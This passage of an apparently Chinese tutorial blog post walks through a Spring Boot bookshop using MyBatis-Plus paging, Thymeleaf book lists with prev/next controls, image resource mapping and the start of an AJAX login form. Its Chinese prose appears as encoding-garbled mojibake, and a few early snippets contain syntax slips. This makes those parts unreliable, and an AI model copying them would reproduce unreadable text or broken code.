ä¸Š@Serviceæ³¨è§£å°±è¡Œäº†ï¼Œåœ¨å®˜æ–¹æ–‡æ¡£èƒ½çœ‹åˆ°è¯¥æ¥å£çš„å®šä¹‰</p><p><a href="https://gitee.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/service/IService.java">https://gitee.com/baomidou/mybatis-plus/blob/3.0/mybatis-plus-extension/src/main/java/com/baomidou/mybatisplus/extension/service/IService.java</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428162440520.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428162440520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç¼–å†™springbootçš„æµ‹è¯•ç±»æ¥è¾“å‡ºæ•°æ®åº“ä¸­ä¹¦çš„ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.kaibook.anzfloor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.kaibook.anzfloor.service.BookService;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AnzfloorApplicationTests</span> &#123;</span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> BookService bookService;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findBookList</span><span class="params">()</span> &#123;</span><br><span class="line">bookService.list().forEach(System.out::println);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428170929503.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230428170929503.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆåŠŸè¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´æ˜bookå®ä½“ç±»å’Œæ•°æ®åº“æˆåŠŸæ‰“é€šé€šé“</p><h3 id="é™æ€æ–‡ä»¶æ¦‚è¿°"><a href="#é™æ€æ–‡ä»¶æ¦‚è¿°" class="headerlink" title="é™æ€æ–‡ä»¶æ¦‚è¿°"></a>é™æ€æ–‡ä»¶æ¦‚è¿°</h3><p>é™æ€æ–‡ä»¶ä½¿ç”¨thymeleafæ¸²æŸ“æ—¶åªä¼šæ‰§è¡Œåé¢çš„th:{}</p><p>é™æ€æ–‡ä»¶è§£æï¼š</p><p>bookModal:å‰ç«¯çš„ç™»å½•æ³¨å†Œï¼Œè´Ÿè´£è¡¨å•çš„æäº¤</p><blockquote><p>divæ ‡ç­¾å†…å®¹ï¼štabindex&#x3D;-1è¡¨ç¤ºå…ƒç´ å¯èšç„¦ roleç”¨æ¥åšè¾…åŠ©å·¥å…·çš„è¯†åˆ«ï¼Œè¿™é‡Œç”¨bootstrapçš„dialogï¼Œèµ·åˆ°ä¸€ä¸ªå¼¹å‡ºæ¡†çš„æ•ˆæœ</p><p><code>aria-labelledby</code>  å±æ€§ç”¨äºå°†ä¸€ä¸ªæˆ–å¤šä¸ªæ ‡ç­¾ä¸å½“å‰å…ƒç´ è¿›è¡Œå…³è”ï¼Œä»è€Œæä¾›è¾…åŠ©åŠŸèƒ½ç”¨æˆ·æ‰€éœ€çš„ä¿¡æ¯ã€‚åœ¨è¿™ä¸ªç‰¹å®šçš„ä¾‹å­ä¸­ï¼Œ <code>aria-labelledby</code>  å±æ€§æŒ‡å®šäº†  <code>div</code>  å…ƒç´ çš„ IDï¼Œè¯¥  <code>div</code>  å…ƒç´ åŒ…å«äº†ç”¨äºç™»å½•æ¨¡æ€æ¡†çš„æ ‡é¢˜ã€‚è¿™ä¸ªå±æ€§çš„ä½œç”¨æ˜¯å‘Šè¯‰å±å¹•é˜…è¯»å™¨å’Œå…¶ä»–è¾…åŠ©åŠŸèƒ½çš„ç”¨æˆ·ï¼Œè¯¥  <code>div</code>  å…ƒç´ çš„å†…å®¹ä¸å“ªä¸ªå…ƒç´ ç›¸å…³è”ï¼Œä»¥ä¾¿ç”¨æˆ·åœ¨ä½¿ç”¨è¯¥å…ƒç´ æ—¶èƒ½å¤Ÿè·å¾—æ­£ç¡®çš„ä¸Šä¸‹æ–‡</p><p>aria-hidden&#x3D;â€trueâ€è¡¨ç¤ºè¯¥å…ƒç´ å¯¹äºå±å¹•é˜…è¯»å™¨ç”¨æˆ·ä¸å¯è§</p></blockquote><p>carouselï¼šå›¾ç‰‡è½®æ’­</p><p>footerï¼šé¡µè„š</p><p>header:å¯¼èˆªæ </p><p>indexï¼šé¦–é¡µ</p><p>bookDate:æ˜¾ç¤ºå›¾ä¹¦åˆ—è¡¨</p><h2 id="Bookä¿¡æ¯å±•ç¤º"><a href="#Bookä¿¡æ¯å±•ç¤º" class="headerlink" title="Bookä¿¡æ¯å±•ç¤º"></a>Bookä¿¡æ¯å±•ç¤º</h2><p>é¦–é¡µç±»ç”¨BookControllerå®ç°ï¼ŒåŠ @RequestMappingæ³¨è§£åšurlæ˜ å°„</p><p>åœ¨index.htmlä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ªå‡½æ•°æ¥ä½¿ç”¨jQuery.load()æ¥åŠ è½½é¡µçš„æ•°æ®ï¼Œç”¨contextPath+&#x2F;book&#x2F;getBookDataåšurl</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510172919337.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510172919337.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚ä¸‹å‡½æ•°ï¼Œå°±æ˜¯å±•ç¤ºç¬¬ä¸€é¡µ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   $(<span class="string">&quot;#selected&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,<span class="title function_">buildQuery</span>(<span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line">   $(<span class="string">&quot;#recommend&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,<span class="title function_">buildQuery</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">   $(<span class="string">&quot;#bargain&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,<span class="title function_">buildQuery</span>(<span class="number">1</span>,<span class="number">3</span>));</span><br><span class="line">         &#125;)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­contextç”¨javascriptçš„æ¥ä»requestä¸­è¿›è¡Œè·å–åº”ç”¨è·¯å¾„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> contextPath = [[$&#123;#request.<span class="title function_">getContextPath</span>()&#125;]];</span><br></pre></td></tr></table></figure><p>å£°æ˜å‡½æ•°buildQuery()æ¥è¿”å›é¡µæ•°å’Œåˆ†ç±»ï¼ˆå¦‚æœundefinedå°±æ˜¯ç¬¬ä¸€é¡µï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±æ˜¯pageï¼Œpageä¼šåœ¨åé¢ç”¨iPage.getCurrent()æ¥è¿›è¡Œæ§åˆ¶)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">buildQuery</span><span class="params">(page,category)</span> &#123;</span><br><span class="line"><span class="type">var</span> <span class="variable">query</span> <span class="operator">=</span> &#123;&#125;;</span><br><span class="line">query.page = typeof page == <span class="string">&quot;undefined&quot;</span> ? <span class="number">1</span> : page;</span><br><span class="line">query.category = category;</span><br><span class="line"><span class="keyword">return</span> query;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨bookControlleré‡Œåšè·¯å¾„æ˜ å°„ï¼Œç»“æœè¿”å›åˆ°bookDataï¼Œåœ¨bookDataé‡Œåšå›¾ä¹¦å±•ç¤ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getBookData&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getBookData</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;bookData&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ•°æ®æ§åˆ¶ç”¨modelå®ç°ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510173528012.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510173528012.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç½‘é¡µè¯·æ±‚ä¸€ä¸ªRequestMappingæ—¶ï¼Œå¦‚æœç›®æ ‡æœ‰modelå‚æ•°ï¼Œå°±ä¼šå¸¦ä¸Šæ•´ä¸ªç½‘é¡µä½œä¸ºmodel</p><p>å‚æ•°ç”¨spring.uiçš„Modelå°è£…æ¨¡å‹æ•°æ®ã€‚ç”±äºè¦å®ç°åˆ†é¡µåŠŸèƒ½ï¼Œç”¨IPageå¯¹è±¡è·å–æ•°æ®ï¼Œç”±äºéœ€è¦ä½¿ç”¨mybatis serviceçš„æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å®šä¹‰bookServiceçš„æ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mybatisåˆ†é¡µ</span></span><br><span class="line">IPage&lt;Book&gt; iPage  = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(<span class="number">1</span>,<span class="number">4</span>),<span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;.eq(<span class="string">&quot;category&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨1,4å°±æ˜¯ç¬¬ä¸€é¡µï¼Œ4ç»„æ•°æ®</p><p>ç”¨<code>bookService.page(new Page&lt;&gt;(page,4),queryWrapper)</code>è¿›è¡Œå®šä¹‰çš„æ—¶å€™ï¼Œé¡µå°±æŒ‰åˆ†ç±»ç»™å®šä¹‰å¥½äº†ï¼Œåªéœ€è¦æ¥æ”¶å‡ ä¸ªå‚æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getBookData</span><span class="params">(Model model,Integer page,Integer category)</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨modelé‡Œç”¨addAttributeå‘bookListå­˜æ”¾æ•°æ®åº“æ•°æ®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ¯ä¸ªåˆ†ç±»éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ç”¨th:each&#x3D;â€book:${bookList}â€è¿›è¡Œéå†ï¼Œç„¶åç”¨th:text&#x3D;â€â€è¿›è¡Œå–å€¼ï¼ˆç®€åŒ–æ•°æ®åº“æ“ä½œï¼‰ï¼Œbookåšå­å¾ªç¯å˜é‡ï¼Œå­˜æ”¾ä¸€æ¡æ•°æ®ï¼Œæ¯”å¦‚${book.name}å°±å¯¹åº”äº†æ•°æ®åº“çš„name<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510164650155.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510164650155.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510163903403.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510163903403.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†å®šä¹‰ä¸€ä¸‹ä¸Šä¸€é¡µå’Œä¸‹ä¸€é¡µï¼šå‰ç«¯ç”¨äº‹ä»¶th:onclick&#x3D;â€â€è°ƒç”¨loadDataæ¥è¿›è¡Œç¿»é¡µ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData(&#123;$pre&#125;,&#123;$category&#125;)&quot;</span>&gt;</span>ä¸Šä¸€é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData(&#123;$next&#125;,&#123;$category&#125;)&quot;</span>&gt;</span>ä¸‹ä¸€é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨é¦–é¡µå®ç°loadData(åŠ è½½å…¶ä»–é¡µ)çš„åŠŸèƒ½ï¼šå‚æ•°ä¸ºé¡µç å’Œåˆ†ç±»ï¼Œè°ƒç”¨ä¹‹å‰å®šä¹‰çš„ä¸‰ä¸ªå‡½æ•°ï¼ˆè¯¥å¤§æ ‡é¢˜åˆšå¼€å§‹çš„åœ°æ–¹ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">loadData</span><span class="params">(page,category)</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> node;</span><br><span class="line">    <span class="keyword">if</span>(category == <span class="number">1</span>)&#123;</span><br><span class="line">        node = <span class="string">&quot;selected&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(category == <span class="number">2</span>) &#123;</span><br><span class="line">        node = <span class="string">&quot;recommend&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    node = <span class="string">&quot;bargain&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">                $(<span class="string">&quot;#&quot;</span> + node).load(contextPath + <span class="string">&quot;/book/getBookData&quot;</span>,buildQuery(page,category));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ç¿»é¡µæ§åˆ¶"><a href="#ç¿»é¡µæ§åˆ¶" class="headerlink" title="ç¿»é¡µæ§åˆ¶"></a>ç¿»é¡µæ§åˆ¶</h3><p>åŒæ ·çš„ï¼Œåœ¨javaä»£ç é‡ŒåŠ ä¸ŠåŠ å‡é¡µçš„åŠŸèƒ½</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;pre&quot;</span>,iPage.getCurrent()-<span class="number">1</span>);</span><br><span class="line">model.addAttribute(<span class="string">&quot;next&quot;</span>,iPage.getCurrent()+<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ä¸ºé˜²æ­¢é¡µç æº¢å‡ºï¼ˆè¶…å‡ºé¡µä¸Šé™ï¼‰ï¼Œå®šä¹‰ä¸€ä¸ªcurè¡¨ç¤ºå½“å‰é¡µï¼Œlastè¡¨ç¤ºæœ€åä¸€é¡µï¼ˆæ€»é¡µæ•°ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;cur&quot;</span>,iPage.getCurrent());</span><br><span class="line">model.addAttribute(<span class="string">&quot;pages&quot;</span>,iPage.getPages());</span><br></pre></td></tr></table></figure><p>åœ¨bookDataè¿›è¡Œç¿»é¡µçš„éƒ¨åˆ†ï¼Œth:style&#x3D;â€™pointer-events:noneâ€™å°±ä¼šä½¿â€œä¸‹ä¸€é¡µâ€è¿™ä¸ªæŒ‰é’®ä¸å¯ç”¨</p><p>æ‰€ä»¥å®Œæ•´çš„ä¸Šä¸‹é¡µçš„å¥å­å°±æ˜¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:style</span>=<span class="string">&quot;$&#123;cur == 1&#125; ? &#x27;pointer-events:none&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData($&#123;pre&#125;,$&#123;category&#125;)|&quot;</span>&gt;</span><span class="symbol">&amp;larr;</span>ä¸Šä¸€é¡µ<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">th:style</span>=<span class="string">&quot;$&#123;cur == last&#125;  ? &#x27;pointer-events:none&#x27; : &#x27;&#x27;&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|loadData($&#123;next&#125;,$&#123;category&#125;)|&quot;</span>&gt;</span>ä¸‹ä¸€é¡µ <span class="symbol">&amp;rarr;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å›¾ç‰‡æ˜¾ç¤º"><a href="#å›¾ç‰‡æ˜¾ç¤º" class="headerlink" title="å›¾ç‰‡æ˜¾ç¤º"></a>å›¾ç‰‡æ˜¾ç¤º</h3><p>å›¾ç‰‡åè¦ä¸æ•°æ®åº“çš„image_urlsä¸€è‡´</p><p>ç”¨WebMvcConfigç±»é‡å†™WebMvcConfigureræ¥å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addResourceHandlers</span><span class="params">(ResourceHandlerRegistry registry)</span>&#123;</span><br><span class="line">        registry.addResourceHandler(<span class="string">&quot;/public/**&quot;</span>).addResourceLocations(<span class="string">&quot;file://E:\\BaiduNetdiskDownload\\book-shop\\book-shop\\src\\main\\resources\\static\\images\\&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹æœ¬åœ°å›¾ç‰‡æ–‡ä»¶åšæ˜ å°„ï¼Œæ˜ å°„åˆ°webåº”ç”¨çš„&#x2F;public&#x2F;ç›®å½•ä¸‹</p><p>åœ¨bookDataç›®å½•ä¸‹ï¼Œå°±èƒ½ç”¨å¦‚ä¸‹htmlæ’å…¥å›¾ç‰‡</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">th:src</span>=<span class="string">&quot;@&#123;&#x27;/public/&#x27; + $&#123;book.imgUrl&#125;&#125;&gt;</span></span></span><br></pre></td></tr></table></figure><p>åˆ°è¿™ä¸€æ­¥å®Œæˆäº†ä»æ•°æ®åº“ä¸­è·å–å›¾ä¹¦ä¿¡æ¯ï¼Œç”¨å®ä½“ç±»bookå’Œå¯¹åº”çš„controllerï¼Œåˆ©ç”¨modelå®Œæˆå‰åç«¯æ•°æ®çš„ä¼ é€’ã€‚æ ¸å¿ƒçš„bookcontrollerä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/book&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookService bookService;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è·å–å›¾ä¹¦ä¿¡æ¯</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/getBookData&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBookData</span><span class="params">(Model model ,Integer page,Integer category)</span>&#123;</span><br><span class="line">        QueryWrapper&lt;Book&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">        IPage&lt;Book&gt; iPage  = bookService.page(<span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page,<span class="number">4</span>),queryWrapper);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;bookList&quot;</span>,iPage.getRecords());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;cur&quot;</span>,iPage.getCurrent());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;last&quot;</span>,iPage.getPages());</span><br><span class="line">        model.addAttribute(<span class="string">&quot;pre&quot;</span>,iPage.getCurrent()-<span class="number">1</span>);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;next&quot;</span>,iPage.getCurrent()+<span class="number">1</span>);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;category&quot;</span>,category);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bookData&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•é¡µé¢ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510210705729.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230510210705729.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="æ³¨å†ŒåŠŸèƒ½"><a href="#æ³¨å†ŒåŠŸèƒ½" class="headerlink" title="æ³¨å†ŒåŠŸèƒ½"></a>æ³¨å†ŒåŠŸèƒ½</h2><p>ç™»å½•æ³¨å†Œçš„å‰ç«¯ï¼Œè¿™é‡Œæ˜¯ç”¨çš„bootstrapçš„æ¨¡æ€æ¡†ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;modal fade&quot;</span> <span class="attr">id</span>=<span class="string">&quot;loginModal&quot;</span> <span class="attr">tabindex</span>=<span class="string">&quot;-1&quot;</span> <span class="attr">role</span>=<span class="string">&quot;dialog&quot;</span> <span class="attr">aria-labelledby</span>=<span class="string">&quot;loginModalLabel&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¡¨å•çš„usernameéƒ¨åˆ†ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¯·è¾“å…¥ç”¨æˆ·å&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä»–çš„å¯†ç ï¼Œé‚®ç®±ç­‰éƒ½ç›¸åŒ</p><p>æœ€åçš„ç™»å½•bottonæ˜¯è°ƒç”¨äº†è‡ªå®šä¹‰çš„ä¸€ä¸ªloginå‡½æ•°è¿›è¡Œå‘é€è¡¨å•</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ç™»å½•&quot;</span> <span class="attr">th:onclick</span>=<span class="string">&quot;|login()|&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨login_reg.jsé‡Œå¯¹loginå‡½æ•°è¿›è¡Œå®šä¹‰ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">login</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> datas = $(<span class="string">&quot;#loginForm&quot;</span>).<span class="title function_">serialize</span>();</span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: contextPath + <span class="string">&quot;/user/login&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>:datas,</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">        <span class="attr">success</span>:<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#pwdTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;none&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(data == <span class="number">100</span>)&#123;</span><br><span class="line">                $(<span class="string">&quot;#loginModal&quot;</span>).<span class="title function_">modal</span>(<span class="string">&#x27;hide&#x27;</span>);</span><br><span class="line">                <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = contextPath + <span class="string">&quot;/book/index&quot;</span>;</span><br><span class="line">            &#125;  <span class="keyword">else</span> <span class="keyword">if</span>(data == <span class="number">101</span>) &#123;</span><br><span class="line">                $(<span class="string">&quot;#userTip&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;display&quot;</span>,<span class="string">&quot;block&quot;</span>);</span><br><span class="line">            &#125; 